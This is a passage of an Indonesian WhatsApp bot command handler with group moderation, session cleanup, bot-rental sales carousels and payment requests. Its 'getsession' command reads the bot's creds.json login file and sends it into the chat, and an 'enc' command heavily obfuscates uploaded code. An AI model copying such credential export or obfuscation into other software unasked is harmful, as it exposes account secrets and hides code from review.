                } catch (e) {
                    m.reply(`case ${text} tidak ditemukan!`, {
                        quoted: fkontak1
                    })
                }
            }
            break
            case 'delcase': {
                if (!isCreator) return Replyx(mess.owner)
                if (!text) return Replyx('Masukkan Nama Casenya!')
                fs.readFile('Xlesy.js', 'utf8', (err, data) => {
                    if (err) {
                        console.error('Terjadi kesalahan saat membaca file:', err);
                        return;
                    }
                    const regex = new RegExp(`case\\s+'${text.toLowerCase()}':[\\s\\S]*?break`, 'g');
                    const modifiedData = data.replace(regex, '');
                    fs.writeFile('Xlesy.js', modifiedData, 'utf8', (err) => {
                        if (err) {
                            Replyx('Terjadi kesalahan saat menulis file: ', err);
                        } else {
                            Replyx('Case berhasil dihapus dari file');
                        }
                    });
                });
            }
            break
            case 'getsession': {
                if (!isCreator) return Replyx(mess.owner)
                await m.reply({
                    document: fs.readFileSync('./SessionXlesy/creds.json'),
                    mimetype: 'application/json',
                    fileName: 'creds.json'
                }, {
                    quoted: fkontak1
                })
            }
            break  
            case 'delses':   
    case 'deletesession':
case 'delsession': {
    if (!isCreator) return Replyx(mess.owner)

    fs.readdir('./SessionXlesy', async function (err, files) {
        if (err) {
            console.error('Gagal membaca direktori: ' + err)
            return Replyx('Maaf, tidak dapat mengakses folder session.')
        }

        let filteredArray = files.filter(item =>
            ['session-', 'pre-key', 'sender-key', 'app-state'].some(ext => item.startsWith(ext))
        )

        let teks = `Ditemukan *${filteredArray.length}* file session yang tersimpan.\n\n`
        if (filteredArray.length === 0) return Replyx(teks + 'Tidak ada file yang perlu dibersihkan.')

        filteredArray.forEach((e, i) => {
            teks += `• ${e}\n`
        })

        if (!text || text !== 'true') {
            let buttons = [
                {
                    buttonId: `${prefix + command} true`,
                    buttonText: { displayText: "Bersihkan Sekarang" },
                    type: 1
                }
            ]

            await Xlesy.sendButtonMsg(m.chat, {
                text: teks + `\n\nKlik tombol di bawah untuk membersihkan file session.`,
                footer: 'XlesyBot | Manajemen Session',
                buttons: buttons,
                contextInfo: {
                    forwardingScore: 999,
                    isForwarded: true,
                    externalAdReply: {
                        title: m.pushName,
                        body: packname,
                        showAdAttribution: true,
                        thumbnailUrl: fake.gandathumburl,
                        mediaType: 1,
                        previewType: 0,
                        renderLargerThumbnail: false,
                        mediaUrl: my.gh,
                        sourceUrl: my.gh
                    }
                }
            }, { quoted: ftroli })
            return
        }

        // Kalau user setuju membersihkan
        Replyx('Sedang membersihkan file session...')
        filteredArray.forEach(file => {
            fs.unlinkSync('./SessionXlesy/' + file)
        })

        setTimeout(() => {
            Replyx('Pembersihan selesai. Semua file session berhasil dihapus.')
        }, 2000)
    })
}
break
            case 'deletesampah':
            case 'delsampah': {
                if (!isCreator) return Replyx(mess.owner)
                fs.readdir('./database/sampah', async function(err, files) {
                    if (err) {
                        console.error('Unable to scan directory: ' + err);
                        return Replyx('Unable to scan directory: ' + err);
                    }
                    let filteredArray = await files.filter(item => ['gif', 'png', 'bin', 'mp3', 'mp4', 'jpg', 'webp', 'webm', 'opus', 'jpeg'].some(ext => item.endsWith(ext)));
                    let teks = `Terdeteksi ${filteredArray.length} Sampah file\n\n`
                    if (filteredArray.length == 0) return m.reply(teks);
                    filteredArray.map(function(e, i) {
                        teks += (i + 1) + `. ${e}\n`
                    })
                    if (text && text == 'true') {
                        let {
                            key
                        } = await Replyx('Menghapus Sampah File..')
                        await filteredArray.forEach(function(file) {
                            fs.unlinkSync('./database/sampah/' + file)
                        });
                        sleep(2000)
                        Replyx('Berhasil Menghapus Semua Sampah', {
                            edit: key
                        })
                    } else m.reply(teks + `\nKetik _${prefix + command} true_\nUntuk Menghapus`, {
                        quoted: fkontak1
                    })
                });
            }
            break
            // Pastikan 'fs' diimpor di bagian paling atas
            case 'sc':
            case 'script': {
                if (!m.text.startsWith(prefix)) return; // Pastikan hanya bisa dijalankan dengan prefix
                await Xlesy.sendMessage(m.chat, {
                    react: {
                        text: '⏳',
                        key: m.key
                    }
                }, {
                    quoted: fkontak1
                });
                let audioPath = './lib/media/audio/menu.opus'
                const tut = `${ucapanWaktu} kak @${m.sender.split('@')[0]}
*─────────────────────────*
> Script XlesyVIP
> Di buat Oleh: Gxyenn 
> Link script Enc https://github.com/Gxyenn/XLESYVIP
> Jika Ingin Down/Gitclone, Bisa Tekan Link di atas
> Please Follow My Github Thanks 
*─────────────────────────
_\`© XlesyVIP\`_

 
Apabila Anda tertarik untuk mendapatkan script bot yang no ENC, Anda dapat membelinya langsung dari Owner saya!

*🛍️Price:* \`Rp.25.000\` Benefit:
*─────────────────────────*
- No Enc 90% ( _index.js has been enc_ )
- Supp Button ( _Not for wa business_ )
- Supp Termux, Panel, Vps, Replit, Dll
- No Backdoor! ( _Use Safe Panel!_ )
- Free Update Script 1x
- Total Menu 18
- Total Fitur 500+
- Fitur Fav ( _Brat, Bratvid, Qc, Hd, Ttdl_ )
- Cpanel 3 Server
- System Limit
- User Banned
- User Premium
- Youtube Search
- Pinterest Search
- Play Music Yt
- Sticker
- Sticker Qc
- Sticker Attp
- Sticker Brat
- Sticker Anime Brat
- Sticker Furry Brat
- Bisa Jaga Group
- AntiLink
- AntiDelete
- AntiVirtex
- Downloader Tiktok
- Downloader YouTube
- Downloader Instagram
- Downloader Videy
- Downloader Mediafire
- Upload Image To Url
- Dan Masih Banyak Lainnya!
*─────────────────────────*

🗣️ : Kok *Mahal* Bang?
👤 : Fitur Lengkap Gk *Pasaran* ^‿^

*─────────────────────────*

Owner saya juga membuka jasa sewa bot
mungkin Anda tertarik untuk mencobanya?
ketik .sewa Untuk Melihat List Nya!

_©Gxyenn_`;

                await Xlesy.relayMessage(m.chat, {
                    requestPaymentMessage: {
                        currencyCodeIso4217: 'IDR',
                        amount1000: 25000000,
                        requestFrom: m.sender,
                        noteMessage: {
                            extendedTextMessage: {
                                text: tut,
                                contextInfo: {
                                    mentionedJid: [`${m.sender.split('@')[0]}@s.whatsapp.net`],
                                    externalAdReply: {
                                        showAdAttribution: true,
                                    }
                                }
                            }
                        }
                    }
                }, {
                    quoted: ftroli
                });

                await Xlesy.sendMessage(m.chat, {
                    audio: {
                        url: audioPath
                    },
                    mimetype: 'audio/mp4',
                    ptt: false
                }, {
                    quoted: fkontak1
                });
                await Xlesy.sendMessage(m.chat, {
                    react: {
                        text: '🛍️',
                        key: m.key
                    }
                });
            }
            break

            // Group Menu/
            case 'add': {
                if (!m.isGroup) return m.reply(mess.group)
                if (!m.isAdmin) return m.reply(mess.admin)
                if (!m.isBotAdmin) return m.reply(mess.botAdmin)
                if (!text && !m.quoted) {
                    m.reply(`Contoh: ${prefix + command} 62xxx`, {
                        quoted: fkontak1
                    })

                } else {
                    const numbersOnly = text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender
                    try {
                        await Xlesy.groupParticipantsUpdate(m.chat, [numbersOnly], 'add').then(async (res) => {
                            for (let i of res) {
                                let invv = await Xlesy.groupInviteCode(m.chat)
                                if (i.status == 401) return Replyx('Dia Memblokir Bot!')
                                if (i.status == 409) return Replyx('Dia Sudah Join!')
                                if (i.status == 500) return Replyx('Grub Penuh!')
                                if (i.status == 408) {
                                    await m.reply(`@${numbersOnly.split('@')[0]} Baru-Baru Saja Keluar Dari Grub Ini!\n\nKarena Target Private\n\nUndangan Akan Dikirimkan Ke\n-> wa.me/${numbersOnly.replace(/\D/g, '')}\nMelalui Jalur Pribadi`, {
                                        quoted: fkontak1
                                    })
                                    await m.reply(`${'https://chat.whatsapp.com/' + invv}\n------------------------------------------------------\n\nAdmin: @${m.sender.split('@')[0]}\nMengundang anda ke group ini\nSilahkan masuk jika berkehendak🙇`, {
                                        detectLink: true,
                                        chat: numbersOnly,
                                        quoted: fkontak
                                    }).catch((err) => Replyx('Gagal Mengirim Undangan!'))
                                } else if (i.status == 403) {
                                    let a = i.content.content[0].attrs
                                    await Xlesy.sendGroupInvite(m.chat, numbersOnly, a.code, a.expiration, m.metadata.subject, `Admin: @${m.sender.split('@')[0]}\nMengundang anda ke group ini\nSilahkan masuk jika berkehendak🙇`, null, {
                                        mentions: [m.sender]
                                    })
                                    await m.reply(`@${numbersOnly.split('@')[0]} Tidak Dapat Ditambahkan\n\nKarena Target Private\n\nUndangan Akan Dikirimkan Ke\n-> wa.me/${numbersOnly.replace(/\D/g, '')}\nMelalui Jalur Pribadi`, {
                                        quoted: fkontak1
                                    })
                                } else if (![200, 401, 409, 500].includes(i.status)) {
                                    Replyx('Gagal Add User\nStatus : ' + i.status)
                                }
                            }
                        })
                    } catch (e) {
                        Replyx('Terjadi Kesalahan! Gagal Add User', {
                            quoted: fkontak1
                        })
                    }
                }
            }
            break
            case 'kick': {
                if (!m.isGroup) return m.reply(mess.group)
                if (!m.isAdmin) return m.reply(mess.admin)
                if (!m.isBotAdmin) return m.reply(mess.botAdmin)
                if (!text && !m.quoted) {
                    m.reply(`Contoh: ${prefix + command} 62xxx`, {
                        quoted: fkontak1
                    })
                } else {
                    const numbersOnly = text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender
                    await Xlesy.groupParticipantsUpdate(m.chat, [numbersOnly], 'remove').catch((err) => Replyx('Gagal Kick User!', {
                        quoted: fkontak1
                    }))
                }
            }
            break
            case 'promote': {
                if (!m.isGroup) return m.reply(mess.group)
                if (!m.isAdmin) return m.reply(mess.admin)
                if (!m.isBotAdmin) return m.reply(mess.botAdmin)
                if (!text && !m.quoted) {
                    m.reply(`Contoh: ${prefix + command} 62xxx`, {
                        quoted: fkontak1
                    })
                } else {
                    const numbersOnly = text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender
                    await Xlesy.groupParticipantsUpdate(m.chat, [numbersOnly], 'promote').catch((err) => Replyx('Gagal!'))
                }
            }
            break
            case 'demote': {
                if (!m.isGroup) return m.reply(mess.group)
                if (!m.isAdmin) return m.reply(mess.admin)
                if (!m.isBotAdmin) return m.reply(mess.botAdmin)
                if (!text && !m.quoted) {
                    m.reply(`Contoh: ${prefix + command} 62xxx`, {
                        quoted: fkontak1
                    })
                } else {
                    const numbersOnly = text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender
                    await Xlesy.groupParticipantsUpdate(m.chat, [numbersOnly], 'demote').catch((err) => Replyx('Gagal!', {
                        quoted: fkontak1
                    }))
                }
            }
            break
            case 'setname':
            case 'setnamegc':
            case 'setsubject':
            case 'setsubjectgc': {
                if (!isCreator) return Replyx(mess.owner)
                if (!m.isGroup) return m.reply(mess.group)
                if (!m.isAdmin) return m.reply(mess.admin)
                if (!m.isBotAdmin) return m.reply(mess.botAdmin)
                if (!text && !m.quoted) {
                    m.reply(`Contoh: ${prefix + command} textnya`, {
                        quoted: fkontak1
                    })
                } else {
                    const teksnya = text ? text : m.quoted.text
                    await Xlesy.groupUpdateSubject(m.chat, teksnya).catch((err) => Replyx('Gagal!', {
                        quoted: fkontak1
                    }))
                }
            }
            break
            case 'setdesc':
            case 'setdescgc':
            case 'setdesk':
            case 'setdeskgc': {
                if (!m.isGroup) return m.reply(mess.group)
                if (!m.isAdmin) return m.reply(mess.admin)
                if (!m.isBotAdmin) return m.reply(mess.botAdmin)
                if (!text && !m.quoted) {
                    m.reply(`Contoh: ${prefix + command} textnya`, {
                        quoted: fkontak1
                    })
                } else {
                    const teksnya = text ? text : m.quoted.text
                    await Xlesy.groupUpdateDescription(m.chat, teksnya).catch((err) => Replyx('Gagal!', {
                        quoted: fkontak1
                    }))
                }
            }
            break
            case 'setppgroups':
            case 'setppgrup':
            case 'setppgc': {
                if (!m.isGroup) return m.reply(mess.group)
                if (!m.isAdmin) return m.reply(mess.admin)
                if (!m.isBotAdmin) return m.reply(mess.botAdmin)
                if (!m.quoted) return Replyx('Reply Gambar yang mau dipasang di Profile Bot', {
                    quoted: fkontak1
                })
                if (!/image/.test(quoted.type)) return m.reply(`Reply Image Dengan Caption ${prefix + command}`, {
                    quoted: fkontak1
                })
                let media = await Xlesy.downloadAndSaveMediaMessage(quoted, 'ppgc.jpeg')
                if (text.length > 0) {
                    let {
                        img
                    } = await generateProfilePicture(media)
                    await Xlesy.query({
                        tag: 'iq',
                        attrs: {
                            target: m.chat,
                            to: '@s.whatsapp.net',
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    await fs.unlinkSync(media)
                    Replyx('Sukses', {
                        quoted: fkontak1
                    })
                } else {
                    await Xlesy.updateProfilePicture(m.chat, {
                        url: media
                    })
                    await fs.unlinkSync(media)
                    Replyx('Sukses', {
                        quoted: fkontak1
                    })
                }
            }
            break
            case 'delete':
            case 'del':
            case 'd': {
                if (!m.quoted) return Replyx('Reply pesan yang mau di delete', {
                    quoted: fkontak1
                })
                await Xlesy.sendMessage(m.chat, {
                    delete: {
                        remoteJid: m.chat,
                        fromMe: m.isBotAdmin ? false : true,
                        id: m.quoted.id,
                        participant: m.quoted.sender
                    }
                })
            }
            break
            case 'pin':
            case 'unpin': {
                if (!m.isGroup) return m.reply(mess.group)
                if (!m.isAdmin) return m.reply(mess.admin)
                if (!m.isBotAdmin) return m.reply(mess.botAdmin)
                await Xlesy.sendMessage(m.chat, {
                    pin: {
                        type: command == 'pin' ? 1 : 0,
                        time: 2592000,
                        key: m.quoted ? m.quoted.key : m.key
                    }
                })
            }
            break
            case 'linkgroup':
            case 'linkgrup':
            case 'linkgc':
            case 'urlgroup':
            case 'urlgrup':
            case 'urlgc': {
                if (!m.isGroup) return m.reply(mess.group)
                if (!m.isAdmin) return m.reply(mess.admin)
                if (!m.isBotAdmin) return m.reply(mess.botAdmin)
                let response = await Xlesy.groupInviteCode(m.chat)
                await m.reply(`https://chat.whatsapp.com/${response}\n\nLink Group : ${(store.groupMetadata[m.chat] || await Xlesy.groupMetadata(m.chat)).subject}`, {
                    detectLink: true
                }, {
                    quoted: fkontak1
                })
            }
            break
            case 'revoke':
            case 'newlink':
            case 'newurl': {
                if (!m.isGroup) return m.reply(mess.group)
                if (!m.isAdmin) return m.reply(mess.admin)
                if (!m.isBotAdmin) return m.reply(mess.botAdmin)
                await Xlesy.groupRevokeInvite(m.chat).then((a) => {
                    m.reply(`Sukses Menyetel Ulang, Tautan Undangan Grup ${m.metadata.subject}`, {
                        quoted: fkontak1
                    })
                }).catch((err) => Replyx('Gagal!'))
            }
            break
            case 'group':
            case 'grup':
            case 'gc': {
                if (!m.isGroup) return m.reply(mess.group)
                if (!m.isAdmin) return m.reply(mess.admin)
                if (!m.isBotAdmin) return m.reply(mess.botAdmin)
                let teks = text.split(' ')
                let set = db.groups[m.chat]
                switch (teks[0].toLowerCase()) {
                    case 'close':
                    case 'open':
                        await Xlesy.groupSettingUpdate(m.chat, teks[0] == 'close' ? 'announcement' : 'not_announcement').then(a => m.reply(`*Sukses ${teks[0] == 'open' ? 'Membuka' : 'Menutup'} Group*`, {
                            quoted: fkontak1
                        }))
                        break
                    case 'join':
                        const _list = await Xlesy.groupRequestParticipantsList(m.chat).then(a => a.map(b => b.jid))
                        if (/(a(p|pp|cc)|(ept|rove))|true|ok/i.test(teks[1])) {
                            await Xlesy.groupRequestParticipantsUpdate(m.chat, _list, 'approve').catch(e => m.reply({
                                react: {
                                    text: '❌',
                                    key: m.key
                                }
                            }))
                        } else if (/reject|false|no/i.test(teks[1])) {
                            await Xlesy.groupRequestParticipantsUpdate(m.chat, _list, 'reject').catch(e => m.reply({
                                react: {
                                    text: '❌',
                                    key: m.key
                                }
                            }))
                        } else {
                            m.reply(`List Request Join :\n${_list.length > 0 ? '- @' + _list.join('\n- @').split('@')[0] : '*Nothing*'}\nExample : ${prefix + command} approve/reject`, {
                                quoted: fkontak1
                            })
                        }
                        break
                    case 'pesansementara':
                    case 'disappearing':
                        if (/90|7|1|24|on/i.test(teks[1])) {
                            Xlesy.sendMessage(m.chat, {
                                disappearingMessagesInChat: /90/i.test(teks[1]) ? 7776000 : /7/i.test(teks[1]) ? 604800 : 86400
                            })
                        } else if (/0|off|false/i.test(teks[1])) {
                            Xlesy.sendMessage(m.chat, {
                                disappearingMessagesInChat: 0
                            })
                        } else Replyx('Silahkan Pilih :\n90 hari, 7 hari, 1 hari, off', {
                            quoted: fkontak1
                        })
                        break
                    case 'antilink':
                    case 'antivirtex':
                    case 'antidelete':
                    case 'welcome':
                    case 'mute':
                    case 'antitoxic':
                    case 'waktusholat':
                    case 'nsfw':
                        if (/on|true/i.test(teks[1])) {
                            if (set[teks[0]]) return Replyx('*Sudah Aktif Sebelumnya*', {
                                quoted: fkontak1
                            })
                            set[teks[0]] = true
                            Replyx('*Sukse Change To On*', {
                                quoted: fkontak1
                            })
                        } else if (/off|false/i.test(teks[1])) {
                            set[teks[0]] = false
                            Replyx('*Sukse Change To Off*', {
                                quoted: fkontak1
                            })
                        } else {
                            m.reply(`❗${teks[0].charAt(0).toUpperCase() + teks[0].slice(1)} on/off`, {
                                quoted: fkontak1
                            })
                        }
                        break
                    default:
                        m.reply(`${m.metadata.subject}\n- Mute : ${set.mute ? '✅' : '❌'}\n- Anti Link : ${set.antilink ? '✅' : '❌'}\n- Anti Virtex : ${set.antivirtex ? '✅' : '❌'}\n- Anti Delete : ${set.antidelete ? '✅' : '❌'}\n- Welcome : ${set.welcome ? '✅' : '❌'}\n- Pesan Sementara: on/off\n- Join acc/reject\n\nExample:\n${prefix + command} antilink off`, {
                            quoted: fkontak1
                        })
                }
            }
            break
            case 'tagall': {
                if (!m.isGroup) return m.reply(mess.group)
                if (!m.isAdmin) return m.reply(mess.admin)
                if (!m.isBotAdmin) return m.reply(mess.botAdmin)
                let setv = pickRandom(listv)
                let teks = `*Tag All*\n\n*Pesan :* ${q ? q : ''}\n\n`
                for (let mem of m.metadata.participants) {
                    teks += `${setv} @${mem.id.split('@')[0]}\n`
                }
                await m.reply(teks, {
                    mentions: m.metadata.participants.map(a => a.id)
                }, {
                    quoted: fkontak1
                })
            }
            break
            case 'hidetag':
            case 'h': {
                if (!m.isGroup) return m.reply(mess.group)
                if (!m.isAdmin) return m.reply(mess.admin)
                if (!m.isBotAdmin) return m.reply(mess.botAdmin)
                await m.reply(q ? q : '', {
                    mentions: m.metadata.participants.map(a => a.id)
                }, {
                    quoted: fkontak1
                })
            }
            break
            case 'totag': {
                if (!m.isGroup) return m.reply(mess.group)
                if (!m.isAdmin) return m.reply(mess.admin)
                if (!m.isBotAdmin) return m.reply(mess.botAdmin)
                if (!m.quoted) return m.reply(`Reply pesan dengan caption ${prefix + command}`, {
                    quoted: fkontak1
                })
                delete m.quoted.chat
                await Xlesy.sendMessage(m.chat, {
                    forward: m.quoted.fakeObj,
                    mentions: m.metadata.participants.map(a => a.id)
                })
            }
            break
            case 'listonline':
            case 'liston': {
                if (!m.isGroup) return m.reply(mess.group)
                let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
                if (!store.presences || !store.presences[id]) return Replyx('Sedang Tidak ada yang online!', {
                    quoted: fkontak1
                })
                let online = [...Object.keys(store.presences[id]), botNumber]
                await Replyx('List Online:\n\n' + online.map(v => setv + ' @' + v.replace(/@.+/, '')).join`\n`, {
                    mentions: online
                }).catch((e) => Replyx('Sedang Tidak Ada Yang Online..', {
                    quoted: fkontak1
                }))
            }
            break

            // Bot Menu
            case 'jasajadibot': {
                await Xlesy.sendMessage(m.chat, {
                    react: {
                        text: '⏳',
                        key: m.key
                    }
                }, {
                    quoted: fkontak1
                });
                let imagePath = './lib/media/image/Gxyenn.png'
                const uploadFile = {
                    upload: Xlesy.waUploadToServer
                };
                var imageMessage = await prepareWAMessageMedia({
                        image: {
                            url: imagePath
                        },
                    },
                    uploadFile,
                );
                const product = {
                    productImage: imageMessage.imageMessage,
                    productId: "8118443944856567",
                    title: "✦ 𝗝𝗮𝘀𝗮 𝗝𝗮𝗱𝗶 𝗕𝗼𝘁 ✦",
                    description: "©Gxyenn",
                    currencyCode: "IDR",
                    priceAmount1000: "10000",
                    productImageCount: 1,
                };
                const productData = {
                    product: product,
                    businessOwnerJid: `6283877636168@s.whatsapp.net`,
                };
                const productMessage = {
                    productMessage: productData
                };
                var response = await generateWAMessageFromContent(
                    m.chat,
                    proto.Message.fromObject(productMessage),
                    m.quoted && m.quoted.fromMe ?
                    {
                        contextInfo: {
                            ...m.msg.contextInfo
                        }
                    } :
                    {},
                );
                await Xlesy.relayMessage(m.chat, response.message, {
                    messageId: response.key.id,
                });
            }
            break
            case 'sewalist':
            case 'sewa':
            case 'sewabot':
            case 'sewa bot': {
                Xlesy.sendMessage(m.chat, {
                    react: {
                        text: '⏳',
                        key: m.key
                    }
                });
                const packages = [{
                        title: `✅ *\`Paket Standard\`*`,
                        description: "Price: Rp.8.000/group\nPerpanjang: Rp.3.000\nFree 1 User Premium 3d\nMasa aktif 7 hari",
                        buttonText: "Buy Paket Standard",
                        buttonUrl: "https://wa.me/6283877636168?text=_Hallo+Min=Saya+Mau+Sewa+Paket+Standar_"
                    },
                    {
                        title: `✅ *\`Paket Reguler\`*`,
                        description: "Price: Rp.15.000/group\nPerpanjang: Rp.5.000\nCustom 1 Command\nFree 3 User Premium 5d\nMasa aktif 30 hari",
                        buttonText: "Buy Paket Reguler",
                        buttonUrl: "https://wa.me/6283877636168?text=_Hallo+Min=Saya+Mau+Sewa+Paket+Reguler_"
                    },
                    {
                        title: `✅ *\`Paket Luxury\`*`,
                        description: "Price: Rp.27.000/group\nPerpanjang: Rp.7.000\nCustom 3 Command\nFree 5 User Premium 30d\nMasa aktif 3 bulan",
                        buttonText: "Buy Paket Luxury",
                        buttonUrl: "https://wa.me/6283877636168?text=_Hallo+Min=Saya+Mau+Sewa+Paket+Luxury_"
                    },
                    {
                        title: `✅ *\`Paket Supreme\`*`,
                        description: "Price: Rp.32.000/group\nPerpanjang: Rp.10.000\nCustom 5 Command\nFree 7 User Premium 3 Bulan\nMasa aktif 5 bulan",
                        buttonText: "Buy Paket Supreme",
                        buttonUrl: "https://wa.me/6285810287828?text=%60Assalamualaikum+Wr+Wb%60%0A_Saya+Ingin+Sewa+Bot+Yang+Paket+Premium+Bang_"
                    },
                    {
                        title: `✅ *\`Paket Visionary\`*`,
                        description: `Price: Rp.50.000/group\nPerpanjang: Rp.13.000\nCustom 7 Command\nFree 10 User Premium 5 Bulan\nMasa aktif 1 Tahun`,
                        buttonText: "Buy Paket Visionary",
                        buttonUrl: "https://wa.me/6283877636168?text=_Hallo+Min=Saya+Mau+Sewa+Paket+Visionary_"
                    }
                ];

                const createImage = async (path) => {
                    const {
                        imageMessage
                    } = await generateWAMessageContent({
                        image: {
                            url: path
                        }
                    }, {
                        upload: Xlesy.waUploadToServer
                    });
                    return imageMessage;
                };

                const imagePath = './lib/media/image/Gxyenn.png'; // Path lokal ke gambar
                const cards = [];
                for (const item of packages) {
                    const imageMessage = await createImage(imagePath);
                    cards.push({
                        body: proto.Message.InteractiveMessage.Body.fromObject({
                            text: item.description
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.fromObject({
                            text: `Sistem perpanjangan hanya berlaku jika sisa waktu sewa tinggal 1 hari. Jika sudah habis, perpanjangan tidak bisa dilakukan, kecuali untuk Paket Supreme Dan Paket Visionary.`
                        }),
                        header: proto.Message.InteractiveMessage.Header.fromObject({
                            title: item.title,
                            hasMediaAttachment: true,
                            imageMessage
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                            buttons: [{
                                name: "cta_url",
                                buttonParamsJson: `{"display_text":"${item.buttonText}","url":"${item.buttonUrl}"}`
                            }]
                        })
                    });
                }

                const carouselMessage = generateWAMessageFromContent(m.chat, {
                    viewOnceMessage: {
                        message: {
                            interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                                body: proto.Message.InteractiveMessage.Body.create({
                                    text: `\n*\`*\`LIST SEWA BOT\`*\n\nBerikut Adalah List *Sewa XLESYVIP*\nMurah Kann~😛`
                                }),
                                footer: proto.Message.InteractiveMessage.Footer.create({
                                    text: author,
                                }),
                                header: proto.Message.InteractiveMessage.Header.create({
                                    hasMediaAttachment: false
                                }),
                                carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                                    cards
                                })
                            })
                        }
                    }
                }, {});


                await Xlesy.relayMessage(m.chat, carouselMessage.message, {
                    messageId: carouselMessage.key.id
                });

                await Xlesy.sendMessage(m.chat, {
                    react: {
                        text: '🛍️',
                        key: m.key
                    }
                });
            }
            break
case 'enc':
case 'encrypt': {
    if (!m.text.startsWith(prefix)) return;
    if (!m.quoted) return Replyx(`Example: ${prefix + command} reply file .js`);
    if (mime !== "application/javascript") return Replyx(`Example: ${prefix + command} (reply file .js)`, { quoted: fkontak1 });

    let media = await m.quoted.download();
    let filename = m.quoted.message?.documentMessage?.fileName || 'unknown.js';

    fs.writeFileSync(`./database/sampah/@enc_${filename}`, media);
    await Replyx("Memproses encrypt code . . .", { quoted: fkontak1 });

    try {
        let obfuscated = await JsConfuser.obfuscate(media.toString(), {
            target: "node",
            preset: "high",
            calculator: true,
            compact: true,
            hexadecimalNumbers: true,
            controlFlowFlattening: 0.75,
            deadCode: 0.2,
            dispatcher: true,
            duplicateLiteralsRemoval: 0.75,
            flatten: true,
            globalConcealing: true,
            identifierGenerator: "randomized",
            minify: true,
            movedDeclarations: true,
            objectExtraction: true,
            opaquePredicates: 0.75,
            renameVariables: true,
            renameGlobals: true,
            stack: true,
            stringConcealing: true,
            stringCompression: true,
            stringEncoding: true,
            stringSplitting: 0.75
        });

        fs.writeFileSync(`./database/sampah/@enc_${filename}`, obfuscated);
        await Xlesy.sendMessage(m.chat, {
            document: fs.readFileSync(`./database/sampah/@enc_${filename}`),
            mimetype: "application/javascript",
            fileName: filename,
            caption: "Encrypt File Successfully ✅"
        }, { quoted: fkontak1 });
    } catch (e) {
        Replyx("Error: " + e);
    }

    fs.unlinkSync(`./database/sampah/@enc_${filename}`);
}
break;
            case "done": {
                if (!isOwner) return Replyx("👤 Hanya owner yang bisa menggunakan perintah ini.", {
                    quoted: fkontak1
                })
                if (!text || !text.includes(",")) return Replyx("🦖 Format salah!\n_Example : done (barang),(harga)_", {
                    quoted: fkontak1
                })

                let [barang, harga] = text.split(",").map(v => v.trim());

                if (isNaN(harga)) return Replyx("❌ Format harga tidak valid!", {
                    quoted: fkontak1
                })

                let total = Number(harga); // Harga langsung digunakan tanpa konversi tambahan

                let teks = `*\`✅ Transaksi Done By ${namestore} Store, XLESYVIP\`*\n` +
                    `📦 *Barang:* ${barang}\n` +
                    `💸 *Nominal:* Rp${formatRupiah(total)}\n` +
                    `⏰ *Waktu:* ${new Date().toLocaleString("id-ID")}\n\n` +
                    `_Terima kasih telah mempercayai dan menggunakan jasa kami! 🥳_`;

                if (typeof Xlesy !== "undefined" && Xlesy.relayMessage) {
                    Xlesy.relayMessage(m.chat, {
                        requestPaymentMessage: {
                            currencyCodeIso4217: "IDR",
                            amount1000: total * 1000, // WhatsApp butuh format dalam satuan 1000
                            requestFrom: m.sender,
                            noteMessage: {
                                extendedTextMessage: {
                                    text: teks,
                                    contextInfo: {
                                        externalAdReply: {
                                            showAdAttribution: true
                                        }
                                    }
                                }
                            }
                        }
                    }, {});
                } else {
                    m.reply(teks, {
                        quoted: ftroli
                    })
                }
            }
            break

            // Fungsi untuk mengubah angka menjadi format Rupiah
            function formatRupiah(angka) {
                return angka.toLocaleString("id-ID", {
                    style: "currency",
                    currency: "IDR"
                })
            }
            case 'owner': {
                await Xlesy.sendContact(m.chat, owner, m,{ quoted: fkontak1 })
}


            break
case 'profile':  
        case 'cek':  
        case 'me': {  
            const user = Object.keys(db.users)  
            const infoUser = db.users[m.sender]  
            await m.reply(`*👤Profile @${m.sender.split('@')[0]}* :\n🐋User Bot : ${user.includes(m.sender) ? 'True' : 'False'}\n🔥User : ${isVip ? 'VIP' : isPremium ? 'PREMIUM' : 'FREE'}\n🎫Limit : ${infoUser.limit}\n💰Uang : ${infoUser ? infoUser.uang.toLocaleString('id-ID') : '0'}`, {  
                quoted: fkontak1  
            })  
        }  
        break

            case 'leaderboard': {
                const entries = Object.entries(db.users).sort((a, b) => b[1].uang - a[1].uang).slice(0, 10).map(entry => entry[0]);
                let teksnya = '╭──┈➤「 *LEADERBOARD* 」❍\n'
                for (let i = 0; i < entries.length; i++) {
                    teksnya += `│• ${i + 1}. @${entries[i].split('@')[0]}\n│• Balance : ${db.users[entries[i]].uang.toLocaleString('id-ID')}\n│\n`
                }
                m.reply(teksnya + '╰──────┈➤', {
                    quoted: fkontak1
                })
            }
            break
            case 'req':
            case 'request': {
                if (!text) return Replyx('Mau Request apa ke Owner?')
                await m.reply(`*Request Telah Terkirim Ke Owner*\n_Terima Kasih🙏_`, {
                    quoted: fkontak1
                })
                await Xlesy.sendFromOwner(owner, `Pesan Dari : @${m.sender.split('@')[0]}\nUntuk Owner\n\nRequest ${text}`, m, {
                    contextInfo: {
                        mentionedJid: [m.sender],
                        isForwarded: true
                    }
                })
            }
            break            
            case 'totalfitur':
            case 'listcase': 
            case 'totalcase': 
            {
                const total = ((fs.readFileSync('./Xlesy.js').toString()).match(/case '/g) || []).length
                Replyx(`Konichiwa *${m.pushName ? m.pushName : 'Unknown'}!*\nSaat Ini Xlesy Memiliki/Total fitur : ${total}`, {
                    quoted: fkontak1
                })
            }
            break
            case 'daily':
            case 'claim': {
                daily(m, db)
            }
            break
            case 'transfer':
            case 'tf': {
                transfer(m, args, db)
            }
            break
            case 'buy': {
                buy(m, args, db)
            }
            break
            case 'react': {
                Xlesy.sendMessage(m.chat, {
                    react: {
                        text: args[0],
                        key: m.quoted ? m.quoted.key : m.key
                    }
                })
            }
            break
            case 'tagme': {
